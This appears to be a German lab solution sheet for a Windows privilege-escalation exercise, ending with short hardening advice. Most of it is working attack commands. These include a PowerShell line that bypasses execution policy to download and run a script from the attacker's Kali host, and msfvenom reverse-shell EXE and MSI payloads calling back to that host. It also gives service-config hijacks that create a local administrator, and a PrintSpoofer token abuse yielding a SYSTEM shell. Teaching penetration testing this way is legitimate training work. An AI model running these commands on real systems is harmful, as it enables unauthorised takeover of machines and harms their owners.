# Lösung – Übung 09: Windows Privilege Escalation

`<KALI>` = Kali-IP.

## 1. winPEAS

```cmd
REM von Kali übertragen (certutil/SMB), dann:
winPEASx64.exe
REM PowerShell-Variante:
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<KALI>/PowerUp.ps1'); Invoke-AllChecks"
```
Markiert u. a. unquoted services, modifizierbare Service-Binaries, AlwaysInstallElevated, gespeicherte Creds.

## 2. Unquoted Service Path / schwache Service-Rechte

```cmd
REM Dienste mit unquoted path + Leerzeichen:
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
REM Service-Rechte prüfen:
accesschk.exe /accepteula -uwcqv <user> <servicename>
```
**Unquoted** `C:\Program Files\Vuln Service\svc.exe` → Payload nach `C:\Program.exe` (wenn dort schreibbar):
```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o Program.exe
sc stop vulnsvc & sc start vulnsvc        REM startet als SYSTEM
```
**Schwache Perms** (`SERVICE_CHANGE_CONFIG`): binPath umbiegen:
```cmd
sc config vulnsvc binPath= "cmd /c net user hacker Pass123! /add & net localgroup administrators hacker /add"
sc stop vulnsvc & sc start vulnsvc
```

## 3. AlwaysInstallElevated

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
REM beide = 0x1 -> verwundbar:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi        REM läuft als SYSTEM
```

## 4. Token-Abuse

```cmd
whoami /priv
```
Hat der (Service-)Account **SeImpersonatePrivilege** → **PrintSpoofer**/**JuicyPotato**:
```cmd
PrintSpoofer64.exe -i -c cmd      REM -> SYSTEM-Shell
```

## 5. Härtung

- **Service-Pfade quoten**, Service-Binaries/-Config nur Admin-schreibbar, Dienste mit least privilege.
- **AlwaysInstallElevated = 0** (nie aktivieren).
- `SeImpersonatePrivilege` nur wo nötig; aktuelle Patches (Potato-Techniken teils gepatcht).
- **AppLocker/WDAC**, kein User als lokaler Admin, LAPS.

## Häufige Fehler / Troubleshooting

- **Kein Windows-Lab:** konzeptionell durchspielen; Vektoren + Härtung benennen.
- **Service startet Payload nicht:** EXE-Architektur/Pfad/Rechte; `sc query`/Event-Log prüfen.
- **accesschk fehlt:** Sysinternals nachladen (`/accepteula`).
- **AV blockt msfvenom-EXE:** Lab-AV aus/Ausnahme; Encoding ist kein echtes Bypass (siehe exploitation 06).
